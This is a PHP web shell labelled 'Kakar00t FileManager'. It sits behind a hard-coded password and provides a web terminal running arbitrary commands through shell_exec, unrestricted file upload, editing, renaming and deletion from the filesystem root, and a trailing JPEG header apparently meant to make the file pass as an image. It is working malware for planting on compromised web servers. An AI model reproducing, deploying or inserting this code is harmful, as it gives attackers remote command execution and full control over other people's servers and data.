<?php
error_reporting(0);
@ini_set('display_errors', 0);
define('VERSION', '6.9');
define('AUTHOR', 'Kakar00t');
$PASSWORD = 'iniPasswordnya'; // ← GANTI SESUKA
$auth = $_COOKIE['auth'] ?? '';
if ($auth !== md5($PASSWORD)) {
    if (isset($_POST['pass'])) {
        if ($_POST['pass'] === $PASSWORD) {
            setcookie('auth', md5($PASSWORD), time() + 3600, '/');
            header("Location: " . $_SERVER['REQUEST_URI']);
            exit;
        } else {
            $error = "Wrong password!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html><head><meta charset="UTF-8"><title>Login</title>
    <style>
        :root{--bg:#0d1117;--card:#161b22;--border:#30363d;--text:#f0f6fc;--accent:#58a6ff;--danger:#f85149;}
        body{background:var(--bg);color:var(--text);font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
        .login{max-width:400px;width:100%;background:var(--card);border:1px solid var(--border);border-radius:12px;padding:30px;text-align:center;}
        h1{font-size:2.2rem;background:linear-gradient(45deg,var(--accent),#bc8cff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
        input{width:100%;padding:12px;background:#0d1117;border:1px solid var(--border);color:var(--text);border-radius:8px;margin:10px 0;}
        button{padding:12px 24px;background:var(--accent);color:white;border:none;border-radius:8px;cursor:pointer;}
        .error{color:var(--danger);margin:10px 0;}
    </style>
    </head><body>
    <div class="login">
        <h1>KAKAR00T</h1>
        <p>FileManager v<?php echo VERSION; ?></p>
        <?php if(isset($error)) echo "<div class='error'>$error</div>"; ?>
        <form method="post">
            <input type="password" name="pass" placeholder="Password" autofocus required>
            <button type="submit">Login</button>
        </form>
    </div>
    </body></html>
    <?php
    exit;
}
define('ROOT', '/');
$dir = realpath(@$_REQUEST['dir'] ?: getcwd());
if(!$dir || !is_dir($dir)) $dir = realpath(getcwd());
@chdir($dir);
$parent = realpath($dir.'/..');
if(isset($_POST['godir'])){
    $new = realpath($_POST['path']);
    if($new && is_dir($new) && strpos($new, ROOT)===0){
        $dir = $new;
        @chdir($dir);
    }
}
?>
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Kakar00t v<?php echo VERSION; ?></title>
<style>
    :root{--bg:#0d1117;--card:#161b22;--border:#30363d;--text:#f0f6fc;--accent:#58a6ff;--danger:#f85149;--success:#3fb950;--purple:#bc8cff;}
    *{margin:0;padding:0;box-sizing:border-box;}
    body{background:var(--bg);color:var(--text);font-family:monospace;line-height:1.6;padding:15px;}
    .container{max-width:1100px;margin:auto;}
    header{text-align:center;margin-bottom:20px;padding:15px;background:linear-gradient(135deg,var(--card),#1a1f2e);border:1px solid var(--border);border-radius:10px;}
    .logo{font-size:2.2rem;background:linear-gradient(45deg,var(--accent),var(--purple));-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
    .path-bar{background:var(--card);padding:10px;border:1px solid var(--border);border-radius:8px;margin-bottom:15px;display:flex;gap:8px;flex-wrap:wrap;}
    .btn{padding:6px 12px;border:none;border-radius:6px;font-weight:500;cursor:pointer;font-size:0.85rem;}
    .btn-primary{background:var(--accent);color:white;}
    .btn-secondary{background:var(--card);color:var(--text);border:1px solid var(--border);}
    .btn-danger{background:var(--danger);color:white;}
    .btn-success{background:var(--success);color:white;}
    .card{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:15px;margin-bottom:15px;}
    input,textarea{background:#0d1117;border:1px solid var(--border);color:var(--text);padding:8px;border-radius:6px;width:100%;font-family:inherit;}
    textarea{resize:vertical;min-height:120px;}
    table{width:100%;border-collapse:collapse;margin-top:8px;}
    th,td{padding:8px;text-align:left;border-bottom:1px solid var(--border);}
    th{background:rgba(88,166,255,0.1);color:var(--accent);}
    a{color:var(--accent);text-decoration:none;}
    .flex{display:flex;gap:10px;flex-wrap:wrap;}
    .flex > *{flex:1;min-width:260px;}
    .logout{position:fixed;top:8px;right:8px;background:var(--danger);color:white;padding:6px 10px;border-radius:6px;font-size:0.75rem;text-decoration:none;}
    .badge{background:var(--purple);color:white;padding:2px 6px;border-radius:4px;font-size:0.65rem;}
    pre{background:#000;padding:10px;border-radius:6px;max-height:180px;overflow:auto;border:1px solid var(--border);font-size:0.8rem;}
</style>
</head><body>
<a href="?logout" class="logout" onclick="return confirm('Logout?')">Logout</a>
<div class="container">
    <header><div class="logo">KAKAR00T</div><div style="font-size:0.8rem;color:#8b949e;">v<?php echo VERSION; ?> • Protected</div></header>
    <div class="path-bar">
        <form method="post" class="flex" style="align-items:center;">
            <input name="path" value="<?php echo htmlspecialchars($dir); ?>" placeholder="/var/www">
            <button name="godir" class="btn btn-primary">Go</button>
        </form>
        <div style="margin-top:6px;display:flex;gap:4px;">
            <form method="post"><input type="hidden" name="path" value="<?php echo ROOT; ?>"><button name="godir" class="btn btn-secondary">Root</button></form>
            <?php if($parent && $parent != $dir): ?>
            <form method="post"><input type="hidden" name="path" value="<?php echo $parent; ?>"><button name="godir" class="btn btn-secondary">..</button></form>
            <?php endif; ?>
        </div>
    </div>
    <div class="flex">
        <div class="card">
            <h3 style="margin:0 0 8px;font-size:1rem;">Terminal <span class="badge">shell_exec</span></h3>
            <form method="post">
                <input name="cmd" placeholder="id; pwd; ls" autofocus>
                <button type="submit" class="btn btn-primary" style="margin-top:6px;">Run</button>
            </form>
            <?php if(isset($_POST['cmd'])): ?>
            <pre><?php echo htmlspecialchars(shell_exec($_POST['cmd'])); ?></pre>
            <?php endif; ?>
        </div>
        <div class="card">
            <h3 style="margin:0 0 8px;font-size:1rem;">Upload</h3>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="file" required>
                <input name="uppath" value="<?php echo htmlspecialchars($dir); ?>" placeholder="Dest">
                <button type="submit" class="btn btn-success" style="margin-top:6px;">Upload</button>
            </form>
            <?php
            if(isset($_FILES['file']) && $_FILES['file']['error']==0){
                $dest = $_POST['uppath'] ? rtrim($_POST['uppath'],'/').'/' : $dir.'/';
                $dest .= $_FILES['file']['name'];
                echo move_uploaded_file($_FILES['file']['tmp_name'], $dest)
                    ? "<p style='color:var(--success);margin:6px 0;'>Uploaded: <code>$dest</code></p>"
                    : "<p style='color:var(--danger);'>Failed!</p>";
            }
            ?>
        </div>
    </div>
    <div class="card">
        <h3 style="margin:0 0 8px;font-size:1rem;">Dir: <code><?php echo htmlspecialchars($dir); ?></code></h3>
        <table>
            <tr><th>Name</th><th>Size</th><th>Perm</th><th>Type</th><th>Act</th></tr>
            <?php
            $files = @scandir($dir);
            if($files) foreach($files as $f){
                if($f=='.' || $f=='..') continue;
                $p = $dir.'/'.$f; $url = urlencode($p);
                $size = is_file($p) ? formatBytes(filesize($p)) : '-';
                $perm = substr(sprintf('%o', fileperms($p)), -4);
                $type = is_file($p) ? 'file' : (is_dir($p) ? 'dir' : '?');
                $isDir = is_dir($p);
                echo "<tr>
                <td><a href='?dir=$url' style='color:".($isDir?'var(--purple)':'var(--accent)').";'>".($isDir?'DIR: ':'')."$f</a></td>
                <td>$size</td>
                <td><code>$perm</code></td>
                <td><span class='badge' style='background:".($isDir?'var(--purple)':'var(--accent)').";'>$type</span></td>
                <td style='font-size:0.75rem;'>
                    <a href='?edit=$url&dir=".urlencode($dir)."'>Edit</a> |
                    <a href='?rename=$url&dir=".urlencode($dir)."'>Ren</a> |
                    <a href='?del=$url&dir=".urlencode($dir)."' onclick='return confirm(\"Delete $f?\")' style='color:var(--danger);'>Del</a>
                </td></tr>";
            }
            ?>
        </table>
    </div>
    <?php if(isset($_GET['edit'])){ $f = $_GET['edit']; if(is_file($f)): ?>
    <div class="card">
        <h3 style="margin:0 0 8px;font-size:1rem;">Edit: <code><?php echo htmlspecialchars($f); ?></code></h3>
        <form method="post">
            <textarea name="content"><?php echo htmlspecialchars(file_get_contents($f)); ?></textarea>
            <input type="hidden" name="file" value="<?php echo $f; ?>">
            <input type="hidden" name="dir" value="<?php echo urlencode($dir); ?>">
            <button name="save" class="btn btn-success" style="margin-top:6px;">Save</button>
        </form>
    </div>
    <?php endif; } ?>
    <?php if(isset($_GET['rename'])){ $f = $_GET['rename']; if(is_file($f) || is_dir($f)): ?>
    <div class="card">
        <h3 style="margin:0 0 8px;font-size:1rem;">Rename/Move</h3>
        <form method="post">
            <input name="old" value="<?php echo $f; ?>" readonly style="margin-bottom:6px;">
            <input name="new" placeholder="New path" required>
            <input type="hidden" name="dir" value="<?php echo urlencode($dir); ?>">
            <button name="doren" class="btn btn-primary" style="margin-top:6px;">Go</button>
        </form>
    </div>
    <?php endif; } ?>
    <?php
    if(isset($_POST['save']) && file_put_contents($_POST['file'], $_POST['content'])){
        echo "<div class='card' style='border-color:var(--success);'><p style='color:var(--success);margin:6px 0;'>Saved!</p></div>";
    }
    if(isset($_POST['doren']) && @rename($_POST['old'], $_POST['new'])){
        echo "<div class='card' style='border-color:var(--success);'><p style='color:var(--success);margin:6px 0;'>Done!</p></div>";
    } elseif(isset($_POST['doren'])){
        echo "<div class='card' style='border-color:var(--danger);'><p style='color:var(--danger);margin:6px 0;'>Failed!</p></div>";
    }
    if(isset($_GET['del'])){
        $t = $_GET['del'];
        if(is_file($t)) @unlink($t);
        elseif(is_dir($t)) @rmdir($t);
        header("Location: ?dir=".urlencode($dir));
        exit;
    }
    if(isset($_GET['logout'])){
        setcookie('auth', '', time() - 3600, '/');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    ?>
    <div style="text-align:center;margin-top:30px;color:#8b949e;font-size:0.75rem;">
        © <?php echo date('Y'); ?> <b>Kakar00t</b> • <code><?php echo htmlspecialchars(shell_exec('whoami')); ?></code>
    </div>
</div>
<?php
function formatBytes($s,$p=1){$b=log($s,1024);$x=['B','KB','MB','GB','TB'];return round(pow(1024,$b-floor($b)),$p).' '.$x[(int)floor($b)];}
?>
<!-- GAMBAR POLYGLOT MULAI -->
ÿØÿàJFIF``ÿÛC$3br%&<'ÿÀ00"ÿÄÿÄµ}![1AQa"q2‘¡#B±Á $'3–R‚Ñð%brÿÚ 8!1AQa"q2‘¡#B±Á RÑð$3br‚%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚÿÄÿÄµw!1AQaq"2‘¡±B#ÁRÑð3br$4á%ñ'&<()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz‚ƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚÿÄÿÄµ}!1AQaq2‘¡#B±Á RÑð$3br‚%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚÿÚ?÷ú